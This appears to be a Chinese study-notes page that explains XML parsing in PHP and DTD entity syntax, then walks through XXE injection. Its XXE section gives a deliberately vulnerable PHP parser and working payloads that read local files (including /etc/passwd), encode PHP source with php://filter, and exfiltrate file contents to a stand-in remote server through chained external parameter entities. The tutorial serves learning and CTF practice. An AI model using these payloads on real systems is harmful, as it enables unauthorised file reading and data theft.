<h2 id="1-8-XML-的解析"><a href="#1-8-XML-的解析" class="headerlink" title="1.8 XML 的解析"></a>1.8 XML 的解析</h2><p>所有现代浏览器都有内建的 XML 解析器。</p>
<p>XML 解析器把 XML 文档转换为 XML DOM 对象 - 可通过 JavaScript 操作的对象。</p>
<p><strong>XML DOM</strong> :</p>
<p>XML DOM（XML Document Object Model）定义了访问和操作 XML 文档的标准方法，把 XML 文档作为树结构来查看。</p>
<p>通过 DOM 树可以 访问 和 修改或删除 它们的内容，并 创建新的元素。</p>
<p><strong>有两种基本的 XML 解析器类型：</strong></p>
<ul>
<li>基于树的解析器：这种解析器把 XML 文档转换为树型结构。它分析整篇文档，并提供了对树中元素的访问，例如文档对象模型 (DOM)。</li>
<li>基于事件的解析器：将 XML 文档视为一系列的事件。当某个具体的事件发生时，解析器会调用函数来处理。</li>
</ul>
<p>DOM 解析器是基于树的解析器。</p>
<h3 id="1-8-1-PHP-XML-DOM"><a href="#1-8-1-PHP-XML-DOM" class="headerlink" title="1.8.1 PHP XML DOM"></a>1.8.1 PHP XML DOM</h3><p>内建的 DOM 解析器使在 PHP 中处理 XML 文档成为可能。</p>
<p>也就是说DOM XML 解析器函数是 PHP 核心的组成部分。无需安装就可以使用这些函数。</p>
<p><strong>示例：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#xml：&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE message [&lt;!ELEMENT message (hair,country,eye,body)&gt;&lt;!ELEMENT hair (#PCDATA)&gt;&lt;!ELEMENT country (#PCDATA)&gt;&lt;!ELEMENT eye (#PCDATA)&gt; &lt;!ELEMENT body (#PCDATA)&gt; ]&gt;&lt;message&gt;    &lt;hair&gt;Black&lt;/hair&gt;    &lt;country&gt;China&lt;/country&gt;    &lt;eye&gt;big&lt;/eye&gt;    &lt;body&gt;You are handsome!&lt;/body&gt;&lt;/message&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#php:直接输出&lt;?php$xmlDoc = new DOMDocument();#创建DOMDocument对象$xmlDoc-&gt;load(&quot;test.xml&quot;);#将test.xml加载进去print $xmlDoc-&gt;saveXML();#把内部 XML 文档放入一个字符串，用于输出?&gt; </span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#php:遍历 XML&lt;?php$xmlDoc = new DOMDocument();$xmlDoc-&gt;load(&quot;test.xml&quot;);$x = $xmlDoc-&gt;documentElement;foreach ($x-&gt;childNodes AS $item)&#123;    print $item-&gt;nodeName . &quot; = &quot; . $item-&gt;nodeValue . &quot;&lt;br&gt;&quot;;&#125;?&gt; </span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#php:SimpleXML&lt;?php$xml=simplexml_load_file(&quot;test.xml&quot;);print_r($xml);?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php<span class="variable">$xml</span>=simplexml_load_file(<span class="string">&quot;test.xml&quot;</span>);<span class="built_in">echo</span> <span class="variable">$xml</span>-&gt;hair . <span class="string">&quot;&lt;br&gt;&quot;</span>;<span class="built_in">echo</span> <span class="variable">$xml</span>-&gt;country . <span class="string">&quot;&lt;br&gt;&quot;</span>;<span class="built_in">echo</span> <span class="variable">$xml</span>-&gt;eye . <span class="string">&quot;&lt;br&gt;&quot;</span>;<span class="built_in">echo</span> <span class="variable">$xml</span>-&gt;body;?&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php<span class="variable">$xml</span>=simplexml_load_file(<span class="string">&quot;test.xml&quot;</span>);<span class="built_in">echo</span> <span class="variable">$xml</span>-&gt;getName() . <span class="string">&quot;&lt;br&gt;&quot;</span>; foreach(<span class="variable">$xml</span>-&gt;children() as <span class="variable">$child</span>)&#123;    <span class="built_in">echo</span> <span class="variable">$child</span>-&gt;getName() . <span class="string">&quot;: &quot;</span> . <span class="variable">$child</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>;&#125;?&gt;</span><br></pre></td></tr></table></figure>

<p> <a href="https://www.runoob.com/dom/dom-tutorial.html">XML DOM 教程</a></p>
<h2 id="1-9-文档结构-—-树结构"><a href="#1-9-文档结构-—-树结构" class="headerlink" title="1.9 文档结构 — 树结构"></a>1.9 文档结构 — 树结构</h2><ul>
<li><strong>XML声明</strong></li>
<li><strong>DTD文档类型定义（可选）</strong></li>
<li><strong>文档元素</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;	&lt;note&gt;	<span class="comment">#根元素，与其它元素之间是 父子关系;各个子元素之间：同胞关系&lt;to&gt;Tove&lt;/to&gt;#四个子元素：to,from,heading,body&lt;from&gt;Jani&lt;/from&gt;&lt;heading&gt;Reminder&lt;/heading&gt;&lt;body&gt;Don&#x27;t forget me this weekend!&lt;/body&gt;&lt;/note&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="1-9-1-XML声明"><a href="#1-9-1-XML声明" class="headerlink" title="1.9.1 XML声明"></a>1.9.1 XML声明</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;<span class="comment">#XML声明: 用于告诉浏览器这是一个xml文档；当看到该声明时，浏览器会自动调用 xml解释器 运行该xml文档#version属性：用于说明当前xml文档的版本，属性必须#encodeing属性：用于说明当前xml文档使用的字符编码集，xml解析器会使用这个编码来解析xml文档，属性可选</span></span><br></pre></td></tr></table></figure>

<h3 id="1-9-2-DTD文档类型定义（可选）"><a href="#1-9-2-DTD文档类型定义（可选）" class="headerlink" title="1.9.2 DTD文档类型定义（可选）"></a>1.9.2 DTD文档类型定义（可选）</h3><p><strong>DTD(Document Type Definition) 即 文档类型定义</strong>，作用是定义 XML 文档的合法构建模块，这个模块里面 <code>定义了用户自己创建的根元素以及对应的子元素和根元素的合法子元素和属性</code>，那么文档中的所有元素都必须以该DTD为模板, <code>用于对XML的元素的内容进行相应的规范化</code>。</p>
<p><strong>作用：验证你的XML</strong></p>
<p><strong>格式：定义元素</strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">note</span> [<span class="meta">&lt;!ELEMENT <span class="meta-keyword">note</span> (<span class="meta-keyword">to</span>,<span class="meta-keyword">from</span>,<span class="meta-keyword">heading</span>,<span class="meta-keyword">body</span>)&gt;</span><span class="meta">&lt;!ELEMENT <span class="meta-keyword">to</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span><span class="meta">&lt;!ELEMENT <span class="meta-keyword">from</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span><span class="meta">&lt;!ELEMENT <span class="meta-keyword">heading</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span><span class="meta">&lt;!ELEMENT <span class="meta-keyword">body</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span>]&gt;</span></span><br></pre></td></tr></table></figure>

<p>注：W3C 支持一种基于 XML 的 DTD 代替者，它名为 XML Schema</p>
<p><a href="https://www.runoob.com/schema/schema-tutorial.html">XML Schema 菜鸟教程</a></p>
<p><a href="https://www.freebuf.com/column/156863.html">使用 XML Schema 攻击</a></p>
<p><strong>定义实体：</strong></p>
<p>除了在 DTD 中定义 <strong>元素</strong>（其实就是对应 XML 中的标签）以外，我们还能在 DTD 中 <strong>定义实体</strong> (对应XML 标签中的内容)</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;&lt;!ENTITY xxe <span class="string">&quot;test&quot;</span>&gt;]&gt;&lt;creds&gt;    &lt;user&gt;&amp;xxe;&lt;/user&gt;    &lt;pass&gt;mypass&lt;/pass&gt;&lt;/creds&gt;</span><br></pre></td></tr></table></figure>

<p>实体可以从 <strong>外部的 dtd 文件</strong> 中引用</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;&lt;!ENTITY xxe SYSTEM <span class="string">&quot;file:///c:/test.dtd&quot;</span> &gt;]&gt;&lt;creds&gt;    &lt;user&gt;&amp;xxe;&lt;/user&gt;    &lt;pass&gt;mypass&lt;/pass&gt;&lt;/creds&gt;dtd:&lt;!ENTITY xxe SYSTEM <span class="string">&quot;file:///d://test1.txt&quot;</span>&gt; </span><br></pre></td></tr></table></figure>

<p><strong>声明方式</strong></p>
<ul>
<li><p>内部声明</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素 [元素声明]&gt;#例如&lt;!DOCTYPE message [&lt;!ELEMENT message (hair,country,eye,body)&gt;&lt;!ELEMENT hair (#PCDATA)&gt;&lt;!ELEMENT country (#PCDATA)&gt;&lt;!ELEMENT eye (#PCDATA)&gt; &lt;!ELEMENT body (#PCDATA)&gt; ]&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/10/01/XEiQ1UWsDwMqoKk.png" alt="image-20210427173839979"></p>
</li>
<li><p>外部声明</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素 SYSTEM &quot;文件名&quot;&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#例如：&lt;!DOCTYPE message SYSTEM &quot;message.dtd&quot;&gt;#message.dtd&lt;!ELEMENT message (hair,country,eye,body)&gt;&lt;!ELEMENT hair (#PCDATA)&gt;&lt;!ELEMENT country (#PCDATA)&gt;&lt;!ELEMENT eye (#PCDATA)&gt; &lt;!ELEMENT body (#PCDATA)&gt; </span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/10/01/1MXarQISDvh8kjC.png" alt="image-20210427173804619"></p>
</li>
</ul>
<h1 id="二、DTD"><a href="#二、DTD" class="headerlink" title="二、DTD"></a>二、DTD</h1><h2 id="2-1-元素声明"><a href="#2-1-元素声明" class="headerlink" title="2.1 元素声明"></a>2.1 元素声明</h2><ul>
<li><p>普通声明</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ELEMENT element-name category&gt;或&lt;!ELEMENT element-name (element-content)&gt; </span><br></pre></td></tr></table></figure></li>
<li><p>空元素</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ELEMENT element-name EMPTY&gt;实例:&lt;!ELEMENT br EMPTY&gt;XML example:&lt;br /&gt; </span><br></pre></td></tr></table></figure></li>
<li><p>PCDATA元素</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ELEMENT element-name (#PCDATA)&gt;</span><br></pre></td></tr></table></figure></li>
<li><p>带有任何内容的元素</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ELEMENT element-name ANY&gt;</span><br></pre></td></tr></table></figure></li>
<li><p>带有子元素的声明</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ELEMENT element-name (child1)&gt;&lt;!ELEMENT element-name (child1,child2,...)&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">例子：要按顺序&lt;!ELEMENT note (to,from,heading,body)&gt;&lt;!ELEMENT to (#PCDATA)&gt;&lt;!ELEMENT from (#PCDATA)&gt;&lt;!ELEMENT heading (#PCDATA)&gt;&lt;!ELEMENT body (#PCDATA)&gt; </span><br></pre></td></tr></table></figure></li>
<li><p>只出现一次的元素</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ELEMENT element-name (child-name)&gt;</span><br></pre></td></tr></table></figure></li>
<li><p>最少出现一次的元素</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ELEMENT element-name (child-name+)&gt;</span><br></pre></td></tr></table></figure></li>
<li><p>出现零次或多次</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ELEMENT element-name (child-name*)&gt;</span><br></pre></td></tr></table></figure></li>
<li><p>出现零次或一次</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ELEMENT element-name (child-name?)&gt;</span><br></pre></td></tr></table></figure></li>
<li><p>其它</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ELEMENT note (to,from,header,(message|body))&gt; &lt;!ELEMENT note (#PCDATA|to|from|header|message)*&gt; </span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="2-2-属性声明"><a href="#2-2-属性声明" class="headerlink" title="2.2 属性声明"></a>2.2 属性声明</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ATTLIST element-name attribute-name attribute-type attribute-value&gt;</span><br></pre></td></tr></table></figure>

<p><a href="https://www.runoob.com/dtd/dtd-attributes.html">属性类型</a></p>
<h2 id="2-3-实体"><a href="#2-3-实体" class="headerlink" title="2.3 实体"></a>2.3 实体</h2><p>前面了解到DTD是用来定义XML文档当中的元素的，用于规范他们，实际上，它还  用于定义引用普通文本或特殊字符的快捷方式的变量（即 实体）。</p>
<p>实体其实可以看成一个变量，到时候我们可以在 XML 中通过 &amp; 符号进行引用。</p>
<h3 id="2-3-1-普通实体"><a href="#2-3-1-普通实体" class="headerlink" title="2.3.1 普通实体"></a>2.3.1 普通实体</h3><ul>
<li><p>内部声明</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY entity-name &quot;entity-value&quot;&gt; </span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#实体的引用：&amp;，实体名称，分号</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">例子：&lt;!ENTITY day &quot;10&quot;&gt; XML:&lt;day&gt;&amp;day;&lt;/day&gt;</span><br></pre></td></tr></table></figure></li>
<li><p>外部声明</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 SYSTEM &quot;URI/URL&quot;&gt;&lt;!ENTITY 实体名称 PUBLIC &quot;DTD标识名&quot; &quot;公用DTD的URI&quot;区别:    PUBLIC是指公用DTD,其是某个权威机构制定，供特定行业或公司.    SYSTEM是指该外部DTD文件是私有的，即我们自己创建的，没有公开发行，只是个人或在公司内部或者几个合作单位之间使用.    公用DTD使用PUBLIC代替了原来的SYSTEM，并增加了DTD标识名。</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/10/01/cAwrFKT9kLe1oqR.png" alt="image-20210428192136904"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">例子：test1.dtd:&lt;!ENTITY test SYSTEM &quot;file:///d://test1.txt&quot;&gt;XML：&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE test SYSTEM &quot;file:///d://test1.dtd&quot;&gt;&lt;author&gt;&amp;test;&lt;/author&gt; </span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="2-3-2-参数实体"><a href="#2-3-2-参数实体" class="headerlink" title="2.3.2 参数实体"></a>2.3.2 参数实体</h3><p>仅仅在DTD中使用的解析实体</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#内部声明: ENTITY关键字、百分号、名称和替换值&lt;!ENTITY % 实体名称 &quot;实体值&quot;&gt;#外部声明&lt;!ENTITY % 实体名称 SYSTEM &quot;URI&quot;&gt;%实体名;#实体的引用&lt;x&gt;%实体名;&lt;/x&gt;</span></span><br></pre></td></tr></table></figure>

<p>注：</p>
<ol>
<li><p>%两边的空格不能少</p>
</li>
<li><p>参数实体不能像普通实体那样在xml文档内容中进行引用，它的引用范围只在 <strong>当前xml文件的DTD声明</strong> 中，或者是 <strong>当前的DTD文件</strong> 中</p>
</li>
<li><p>在DTD中，所有参数实体必须在引用之前进行声明</p>
</li>
<li><p>参数实体对 无回显XXE 的利用 起了至关重要的作用</p>
</li>
</ol>
<p><a href="https://www.runoob.com/schema/schema-tutorial.html">XML Schema 菜鸟教程</a></p>
<h1 id="三、XXE"><a href="#三、XXE" class="headerlink" title="三、XXE"></a>三、XXE</h1><p>**XML External Entity —  XML外部实体注入漏洞 ** , 发生在 <code>应用程序解析XML输入</code>时，没有禁止外部实体的加载 （ <code>与该选项有关libxml_disable_entity_loader (false);</code>），导致可加载恶意外部文件和代码，造成任意文件读取、命令执行、内网端口扫描、攻击内网网站、发起Dos攻击 等危害。</p>
<p><strong>概述</strong>：攻击者通过 <strong>向服务器注入指定的xml实体内容</strong> ，从而让服务器按照指定的配置进行执行,导致问题。也就是说服务端 <strong>接收和解析</strong> 了来自用户端的xml数据,而又没有做严格的安全控制,从而导致 xml外部实体注入。</p>
<p><strong>产生点：</strong></p>
<ul>
<li>文档类型定义时，可以引用外部的 DTD 文件</li>
<li>XML解析器解析外部实体时支持多种协议（file :///, http:// 等）</li>
</ul>
<p><strong>利用点：</strong></p>
<p>​    通过构造恶意的外部实体，当XML解析器解析了我们所包含的恶意实体时便会触发漏洞  </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">现在很多语言里面对应的解析xml的函数默认是禁止解析外部实体内容的,从而也就直接避免了这个漏洞。<span class="comment">#以PHP为例,在PHP里面解析xml用的是libxml，其在≥2.9.0的版本中,默认是禁止解析xml外部实体内容的。</span></span><br></pre></td></tr></table></figure>

<p><strong>危害</strong></p>
<ul>
<li>文件读取</li>
<li>RCE执行</li>
<li>内网攻击</li>
<li>Dos攻击</li>
</ul>
<h2 id="3-1-利用"><a href="#3-1-利用" class="headerlink" title="3.1 利用"></a>3.1 利用</h2><h3 id="3-1-1-有回显"><a href="#3-1-1-有回显" class="headerlink" title="3.1.1 有回显"></a>3.1.1 有回显</h3><p><strong>通过正常的回显将 外部实体 中的内容读取出来</strong></p>
<h4 id="测试："><a href="#测试：" class="headerlink" title="测试："></a>测试：</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>        libxml_disable_entity_loader (<span class="literal">false</span>);<span class="comment">//禁用加载外部实体的功能，禁用（TRUE）或启用（FALSE）libxml扩展（如DOM，XMLWriter和XMLReader）来加载外部实体    $xmlfile = file_get_contents(&#x27;php://input&#x27;);    $dom = new DOMDocument();//创建一个DOM对象    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); //加载XML//LIBXML_NOENT 	 替代实体//LIBXML_DTDLOAD 加载外部子集    $creds = simplexml_import_dom($dom);//该函数把 DOM 节点转换为 SimpleXMLElement 对象    echo $creds;<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<p><strong>引入内部实体</strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span> <span class="meta">&lt;!DOCTYPE <span class="meta-keyword">xxe</span> [  <span class="meta">&lt;!ENTITY <span class="meta-keyword">test</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///c:/windows/system32/drivers/etc/hosts&quot;</span>&gt;</span> ]&gt;</span> <span class="tag">&lt;<span class="name">creds</span>&gt;</span><span class="symbol">&amp;test;</span><span class="tag">&lt;/<span class="name">creds</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/10/01/BPJbaF2HVAKTXjg.png" alt="image-20210427191038850"></p>
<hr>
<hr>
<p><strong>引入外部参数实体 —– 题目当中经常使用的一个点</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; ?&gt;&lt;!DOCTYPE test [    &lt;!ENTITY % file SYSTEM &quot;http://vps-ip/hack.dtd&quot;&gt;    %file;]&gt;&lt;test&gt;&amp;hhh;&lt;/test&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hack.dtd&lt;!ENTITY hhh SYSTEM &#x27;file:///etc/passwd&#x27;&gt;</span><br></pre></td></tr></table></figure>

<hr>
<hr>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span> <span class="meta">&lt;!DOCTYPE <span class="meta-keyword">xxe</span> [  <span class="meta">&lt;!ENTITY <span class="meta-keyword">test</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///d://222.txt&quot;</span>&gt;</span> ]&gt;</span> <span class="tag">&lt;<span class="name">creds</span>&gt;</span><span class="symbol">&amp;test;</span><span class="tag">&lt;/<span class="name">creds</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>当文件内容当中包含 <code>&lt; 和 &amp;</code> 符号时，就会出现报错</p>
<p>php://filter之前最常出镜的地方是XXE。由于XXE漏洞的特殊性，我们在读取HTML、PHP等文件时可能会抛出此类错误<code>parser error : StartTag: invalid element name</code> 。其原因是，PHP是基于标签的脚本语言，<code>&lt;?php ... ?&gt;</code>这个语法也与XML相符合，所以在解析XML的时候会被误认为是XML，而其中内容（比如特殊字符）又有可能和标准XML冲突，所以导致了出错。</p>
<p><img src="https://i.loli.net/2021/10/01/ZvIz6LwdcMQANU9.png" alt="image-20210427191730235"></p>
<p>解决：使用 <code>CDATA</code></p>
<p>想法一：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt; &lt;!DOCTYPE xxe [  &lt;!ENTITY <span class="built_in">test</span> SYSTEM <span class="string">&quot;file:///d:/222.txt&quot;</span>&gt; ]&gt; &lt;creds&gt;&lt;![CDATA[&amp;<span class="built_in">test</span>;]]&gt;&lt;/creds&gt;<span class="comment">#错误：这只会将 &amp;test; 原模原样的输出</span></span><br></pre></td></tr></table></figure>

<p>想法二：直接在 xml当中进行拼接 —- 普通实体</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt; &lt;!DOCTYPE xxe [  &lt;!ENTITY start <span class="string">&quot;&lt;![CDATA[&quot;</span>&gt;&lt;!ENTITY <span class="built_in">test</span> SYSTEM <span class="string">&quot;file:///d:/222.txt&quot;</span>&gt; &lt;!ENTITY end <span class="string">&quot;]]&gt;&quot;</span>&gt;]&gt; &lt;creds&gt;&amp;start;&amp;<span class="built_in">test</span>;&amp;end;&lt;/creds&gt;<span class="comment">#依旧是大量的报错</span></span><br></pre></td></tr></table></figure>

<p>想法三：参数实体 在 内部DTD拼接</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt; &lt;!DOCTYPE xxe [  &lt;!ENTITY % start <span class="string">&quot;&lt;![CDATA[&quot;</span>&gt;&lt;!ENTITY % <span class="built_in">test</span> SYSTEM <span class="string">&quot;file:///d:/222.txt&quot;</span>&gt; &lt;!ENTITY % end  <span class="string">&quot;]]&gt;&quot;</span>&gt;&lt;!ENTITY all <span class="string">&quot;%start;%test;%end;&quot;</span>&gt;]&gt; &lt;creds&gt;&amp;all;&lt;/creds&gt;<span class="comment">#仍旧有报错</span></span><br></pre></td></tr></table></figure>

<p>根据XML规范所描述：“在DTD内部子集中的参数实体调用，不能混掺到标记语中” ;</p>
<p>也就是说参数实体不能在内部DTD中进行拼接，但是XML规范还声明了一点：“外部参数实体不受此限制”，这就告诉我们可以使用外部的DTD来构造payload，将我们的CDATA内容拼接起来.</p>
<p>想法四：使用外部参数实体</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt; &lt;!DOCTYPE xxe [  &lt;!ENTITY % start <span class="string">&quot;&lt;![CDATA[&quot;</span>&gt;&lt;!ENTITY % <span class="built_in">test</span> SYSTEM <span class="string">&quot;file:///d:/222.txt&quot;</span>&gt; &lt;!ENTITY % end <span class="string">&quot;]]&gt;&quot;</span>&gt;&lt;!ENTITY % dtd SYSTEM <span class="string">&quot;file:///d:/xxe.dtd&quot;</span>&gt;%dtd; ]&gt;&lt;creds&gt;&amp;all;&lt;/creds&gt;xxe.dtd:&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt; &lt;!ENTITY all <span class="string">&quot;%start;%test;%end;&quot;</span>&gt;</span><br></pre></td></tr></table></figure>

<p>可成功显示出 &amp; &lt; 符号</p>
<h4 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h4><p>那么，为了读取包含有敏感信息的PHP等源文件，我们就要先将“可能引发冲突的PHP代码”编码一遍，这里就会用到php://filter。</p>
<p>php://filter是PHP语言中特有的协议流</p>
<p><a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html?page=2#reply-list">https://www.leavesongs.com/PENETRATION/php-filter-magic.html?page=2#reply-list</a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt; &lt;!DOCTYPE xxe [  &lt;!ENTITY <span class="built_in">test</span> SYSTEM <span class="string">&quot;php://filter/read=convert.base64-encode/resource=d:/222.txt&quot;</span>&gt; ]&gt;&lt;creds&gt;&amp;<span class="built_in">test</span>;&lt;/creds&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span><span class="meta">?&gt;</span> &lt;!DOCTYPE xxe [  &lt;!ENTITY test SYSTEM <span class="string">&quot;data://text/plain;base64,&quot;</span>&gt; ]&gt;&lt;creds&gt;&amp;test;&lt;/creds&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/10/01/O7yTFhPHXEMZ5KD.png" alt="image-20210430094755236"></p>
<p><img src="https://i.loli.net/2021/10/01/lnXdb7kDyQFq5K6.png" alt="image-20210430094745930"></p>
<h3 id="3-1-2-无回显"><a href="#3-1-2-无回显" class="headerlink" title="3.1.2 无回显"></a>3.1.2 无回显</h3><p><strong>利用参数实体将本地文件内容读出来后，作为URL中的参数向其指定的服务器发起请求，然后在其指定服务器的日志中读出文件内容</strong></p>
<h4 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>libxml_disable_entity_loader (<span class="literal">false</span>);<span class="variable">$xmlfile</span> = file_get_contents(<span class="string">&#x27;php://input&#x27;</span>);<span class="variable">$dom</span> = <span class="keyword">new</span> DOMDocument();<span class="variable">$dom</span>-&gt;loadXML(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD); <span class="comment">//未输出<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>Payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE convert [ &lt;!ENTITY % test SYSTEM &quot;http://xxe/xxe2.dtd&quot;&gt;%test;%int;%send;]&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xxe2.dtd:&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///d:/222.txt&quot;&gt;&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;http://xxe:9999?p=%file;&#x27;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>日志的读取/文件的接收代码 或者是 开启端口监听</p>
<p>开启端口监听</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python2语法：python -m SimpleHTTPServer portpython3语法：python -m http.server port</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/10/01/7h6VMgZPfzImFHe.png" alt="image-20210430092340860"></p>
<p>说明：</p>
<blockquote>
<p>我们总共连续调用了三个参数实体，%test;%int;%send;</p>
<p>首先调用%test去请求远程服务器上的xxe2.dtd，相当于将xxe2.dtd包含进来，然后调用 %int，在xxe2.dtd文件当中将会调用%file，%file将会获取服务器上的敏感文件222.txt，然后将%file（敏感文件当中的内容）写入%send当中(由于实体的值中不能有 %, 所以将其转成html实体编码 <code>&amp;#37;</code>)；</p>
<p>最后调用 %send ，就会将我们读取到的数据发送到远程 vps上，也就实现了</p>
<p><strong>外带数据</strong>   的效果，解决了xxe无回显的问题。</p>
</blockquote>
<hr>
<hr>
<p><strong>引入服务器文件</strong></p>
